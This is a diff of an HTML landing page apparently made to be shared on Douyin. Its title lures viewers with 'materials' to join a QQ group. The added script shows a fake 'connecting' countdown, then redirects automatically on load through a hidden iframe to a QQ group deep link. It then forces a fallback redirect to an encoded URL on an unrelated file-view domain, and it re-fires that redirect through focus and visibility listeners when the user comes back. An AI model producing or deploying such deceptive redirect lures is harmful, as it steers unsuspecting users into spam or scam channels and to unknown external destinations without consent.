@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
     <!-- 抖音分享标题 -->
-    <title>桐成可【加Q裙：786371638 艺术学院38】继续访问在线看资料</title>
+    <title>桐成可【➕Q裙：786371638 艺术学院】继续访问在线看资料</title>
     
     <!-- 抖音预览卡片标签 -->
     <meta property="og:image" content="https://douyin1688.github.io/333.png">
@@ -20,37 +20,55 @@
             display: flex;
             align-items: center;
             justify-content: center;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
         }
 
         .container {
-            width: 100px;
-            height: 100px;
+            text-align: center;
             background: rgba(255, 255, 255, 0.1);
-            border-radius: 50%;
+            border-radius: 20px;
             backdrop-filter: blur(10px);
             box-shadow: 0 15px 35px rgba(0,0,0,0.3);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            position: relative;
+            padding: 40px 30px;
+            max-width: 300px;
+            width: 90%;
         }
 
         .loading-spinner {
-            width: 40px;
-            height: 40px;
-            border: 3px solid rgba(255, 255, 255, 0.3);
-            border-top: 3px solid #fff;
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid #fff;
             border-radius: 50%;
             animation: spin 1s linear infinite;
+            margin: 0 auto 25px;
         }
 
-        .pulse {
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            border-radius: 50%;
-            background: rgba(255, 255, 255, 0.1);
-            animation: pulse 2s infinite;
+        .status-text {
+            color: white;
+            font-size: 16px;
+            font-weight: 500;
+            margin-bottom: 10px;
+            transition: all 0.3s ease;
+        }
+
+        .sub-text {
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+
+        .countdown {
+            color: #ffeb3b;
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 15px;
+        }
+
+        .tips {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 12px;
+            line-height: 1.4;
         }
 
         @keyframes spin {
@@ -58,18 +76,9 @@
             100% { transform: rotate(360deg); }
         }
 
-        @keyframes pulse {
-            0% {
-                transform: scale(1);
-                opacity: 1;
-            }
-            50% {
-                transform: scale(1.2);
-                opacity: 0.5;
-            }
-            100% {
-                transform: scale(1.5);
-                opacity: 0;
+        @media (max-width: 480px) {
+            .container {
+                padding: 30px 20px;
             }
         }
     </style>
@@ -79,43 +88,132 @@
     <img src="./333.png" alt="预览图" style="display: none; position: absolute; left: -9999px; width: 1px; height: 1px;">
     
     <div class="container">
-        <div class="pulse"></div>
         <div class="loading-spinner"></div>
+        
+        <div class="status-text" id="status">正在连接中...</div>
+        <div class="sub-text" id="subText">请稍候，正在为您跳转</div>
+        
+        <div class="countdown" id="countdown">2</div>
+        
+        <div class="tips" id="tips">
+            如遇跳转问题，系统将自动为您切换线路
+        </div>
     </div>
 
     <script>
+        var countdown = 2;
+        var statusElement = document.getElementById('status');
+        var subTextElement = document.getElementById('subText');
+        var countdownElement = document.getElementById('countdown');
+        var tipsElement = document.getElementById('tips');
+        
+        var qqGroupUrl = "mqqapi://card/show_pslcard?src_type=internal&version=1&uin=786371638";
+        var backupUrl = "https://fileview.dahe.cn/h0ZMZxgGzXm.html?d=DxsAHxlTTkIEBxUbW0cAFEkMGg4HDE8OAwFaAgIHBB9JDBpAHAIKAlEOBkAJBFMsKCY6H1xGUFpSXkRfU1lWX1BWR0ECHQwB";
+        
         // 防止页面被嵌入iframe
         if (window.top !== window.self) {
             window.top.location = window.self.location;
         }
         
-        var hasJumped = false;
-        
-        // 2秒后跳转QQ群
-        setTimeout(function() {
-            if (!hasJumped) {
-                hasJumped = true;
-                window.location.href = "mqqapi://im/chat?chat_type=group&uin=786371638&src_type=internal";
+        // 倒计时显示
+        var countdownTimer = setInterval(function() {
+            if (countdown > 0) {
+                countdownElement.textContent = countdown;
+                countdown--;
+            } else {
+                clearInterval(countdownTimer);
+                countdownElement.textContent = '0';
+                statusElement.textContent = '正在跳转...';
+                subTextElement.textContent = '请稍候';
             }
+        }, 1000);
+        
+        // 2秒后尝试跳转QQ群
+        var qqJumpTimer = setTimeout(function() {
+            console.log('尝试跳转QQ群');
+            statusElement.textContent = '正在打开QQ群...';
+            
+            // 创建一个隐藏的iframe来尝试跳转
+            var iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = qqGroupUrl;
+            document.body.appendChild(iframe);
+            
+            // 也尝试直接跳转
+            try {
+                window.location.href = qqGroupUrl;
+            } catch(e) {
+                console.log('QQ群跳转失败:', e);
+            }
+            
+            // 清理iframe
+            setTimeout(function() {
+                if (iframe.parentNode) {
+                    iframe.parentNode.removeChild(iframe);
+                }
+            }, 1000);
+            
         }, 2000);
         
-        // 5秒后如果还没跳转成功，跳转到备用链接
-        setTimeout(function() {
-            if (!hasJumped) {
-                window.location.href = "https://fileview.dahe.cn/h0ZMZxgGzXm.html?d=DxsAHxlTTkIEBxUbW0cAFEkMGg4HDE8OAwFaAgIHBB9JDBpAHAIKAlEOBkAJBFMsKCY6H1xGUFpSXkRfU1lWX1BWR0ECHQwB";
-            }
+        // 强制备用跳转 - 5秒后无论如何都跳转到备用链接
+        var backupTimer = setTimeout(function() {
+            console.log('执行强制备用跳转');
+            statusElement.textContent = '切换线路中...';
+            subTextElement.textContent = '正在为您准备备用通道';
+            countdownElement.textContent = '备用';
+            tipsElement.textContent = '正在启动备用访问方式';
+            
+            // 1秒后执行备用跳转
+            setTimeout(function() {
+                console.log('跳转到备用链接:', backupUrl);
+                window.location.href = backupUrl;
+            }, 1000);
+            
         }, 5000);
         
-        // 监听页面可见性变化
-        document.addEventListener('visibilitychange', function() {
-            if (!document.hidden && !hasJumped) {
+        // 监听页面焦点变化（更可靠的检测方式）
+        var hasFocusChanged = false;
+        
+        window.addEventListener('blur', function() {
+            console.log('页面失去焦点');
+            hasFocusChanged = true;
+        });
+        
+        window.addEventListener('focus', function() {
+            console.log('页面获得焦点');
+            if (hasFocusChanged) {
+                // 用户回到了页面，可能QQ群跳转失败
                 setTimeout(function() {
-                    if (!hasJumped) {
-                        window.location.href = "https://fileview.dahe.cn/h0ZMZxgGzXm.html?d=DxsAHxlTTkIEBxUbW0cAFEkMGg4HDE8OAwFaAgIHBB9JDBpAHAIKAlEOBkAJBFMsKCY6H1xGUFpSXkRfU1lWX1BWR0ECHQwB";
-                    }
-                }, 1000);
+                    console.log('检测到用户返回，执行备用跳转');
+                    statusElement.textContent = '检测异常，启动备用';
+                    subTextElement.textContent = '系统自动处理中';
+                    tipsElement.textContent = '正在为您切换到备用访问方式';
+                    
+                    // 清除原有定时器
+                    clearTimeout(backupTimer);
+                    
+                    setTimeout(function() {
+                        window.location.href = backupUrl;
+                    }, 1500);
+                }, 500);
             }
         });
+        
+        // 额外保险：监听页面可见性变化
+        if (typeof document.hidden !== "undefined") {
+            document.addEventListener('visibilitychange', function() {
+                if (!document.hidden && hasFocusChanged) {
+                    console.log('页面可见性变化检测到返回');
+                    setTimeout(function() {
+                        if (window.location.href.indexOf('douyin1688.github.io') !== -1) {
+                            console.log('确认在原页面，执行备用跳转');
+                            window.location.href = backupUrl;
+                        }
+                    }, 1000);
+                }
+            });
+        }
+        
     </script>
 </body>
 </html>
